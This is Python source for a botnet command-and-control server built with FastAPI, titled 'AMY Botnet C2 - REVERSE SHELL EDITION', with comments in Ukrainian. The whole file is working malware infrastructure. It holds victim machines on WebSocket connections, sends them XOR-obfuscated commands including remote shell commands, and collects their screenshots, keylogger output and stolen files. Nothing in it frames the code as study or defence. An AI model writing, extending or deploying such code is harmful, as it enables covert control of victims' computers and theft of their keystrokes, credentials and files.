from fastapi import FastAPI, WebSocket, WebSocketDisconnect, Request
from fastapi.responses import FileResponse, Response
import asyncio
import base64
import os
from datetime import datetime

app = FastAPI(title="AMY Botnet C2 - REVERSE SHELL EDITION")

# Шляхи до папок (в межах контейнера /app)
current_file_path = os.path.abspath(__file__)
project_root = os.path.dirname(os.path.dirname(current_file_path))
ui_path = os.path.join(project_root, "ui")

# Створення необхідних папок
for folder in ["screenshots", "logs", "downloads", "stealer"]:
    os.makedirs(folder, exist_ok=True)

active_bots = {}
bot_responses = {}
last_screenshot_data = {} 

# XOR Ключ (має збігатися з клієнтом)
X_KEY = "AMY_2026_SECRET"

def crypt_logic(data: str) -> str:
    key = X_KEY
    return "".join(chr(ord(data[i]) ^ ord(key[i % len(key)])) for i in range(len(data)))

def decrypt(data: str) -> str:
    try:
        decoded = base64.b64decode(data).decode()
        return crypt_logic(decoded)
    except: return None

def encrypt(data: str) -> str:
    res = crypt_logic(data)
    return base64.b64encode(res.encode()).decode()

@app.get("/")
async def read_index():
    return FileResponse(os.path.join(ui_path, "index.html"))

@app.get("/bots")
async def list_bots():
    return {"bots": list(active_bots.keys())}

@app.get("/response/{bot_id}")
async def get_response(bot_id: str):
    res = bot_responses.pop(bot_id, "")
    if res == "SCREENSHOT_LOADED": return {"response": "IMAGE_READY", "is_img": True}
    if res.startswith("FILE_SAVED:"): return {"response": f"FILE_SAVED|{res.split(':',1)[1]}", "is_img": False}
    return {"response": res, "is_img": False}

@app.get("/view_screenshot/{bot_id}")
async def view_screenshot(bot_id: str):
    data = last_screenshot_data.get(bot_id)
    if data: return Response(content=data, media_type="image/png")
    return Response(status_code=404)

@app.get("/download_file/{filename}")
async def download_stolen_file(filename: str):
    # Пошук файлу в папках downloads та stealer
    for folder in ["downloads", "stealer"]:
        fpath = os.path.join(folder, filename)
        if os.path.exists(fpath): return FileResponse(path=fpath, filename=filename)
    return {"error": "File not found"}

@app.post("/command")
async def send_command(bot_id: str, command: str):
    if bot_id in active_bots:
        # Для інтерактивності ми не перезаписуємо bot_responses текстом "Waiting..."
        # щоб не перебивати потік виводу з Shell
        if command not in ["screenshot", "steal", "get_keys"]:
            bot_responses[bot_id] = "> Executing: " + command
        else:
            bot_responses[bot_id] = "Processing specialized command..."
            
        await active_bots[bot_id].send_text(encrypt(command))
        return {"status": "success"}
    return {"status": "error"}

@app.websocket("/ws/{bot_id}")
async def websocket_endpoint(websocket: WebSocket, bot_id: str):
    await websocket.accept()
    active_bots[bot_id] = websocket
    try:
        while True:
            raw = await websocket.receive_text()
            data = decrypt(raw)
            if not data: continue
            
            # Обробка скріншотів
            if data.startswith("SCREENSHOT:"):
                img_bytes = base64.b64decode(data[11:])
                last_screenshot_data[bot_id] = img_bytes
                bot_responses[bot_id] = "SCREENSHOT_LOADED"
            
            # Обробка передачі файлів
            elif data.startswith("FILE_DATA:"):
                parts = data.split(":", 2)
                fname = f"{bot_id}_{parts[1]}"
                with open(f"downloads/{fname}", "wb") as f: f.write(base64.b64decode(parts[2]))
                bot_responses[bot_id] = f"FILE_SAVED:{fname}"
            
            # Обробка автоматичного стілера
            elif data.startswith("STEAL_DATA:"):
                parts = data.split(":", 3)
                s_type, fname, b64_data = parts[1], parts[2], parts[3]
                save_path = f"stealer/{bot_id}_{s_type}_{fname}"
                with open(save_path, "wb") as f: f.write(base64.b64decode(b64_data))
                # Тут ми не міняємо статус, щоб не забивати термінал під час масової пересилки
            
            # Обробка кейлоггера
            elif data.startswith("KEYLOG:"):
                with open(f"logs/{bot_id}.txt", "a") as f: f.write(data[7:] + "\n")
                bot_responses[bot_id] = "Keylog updated."
            
            # Обробка виводу Shell (та всього іншого)
            else:
                bot_responses[bot_id] = data
    except WebSocketDisconnect:
        if bot_id in active_bots: del active_bots[bot_id]

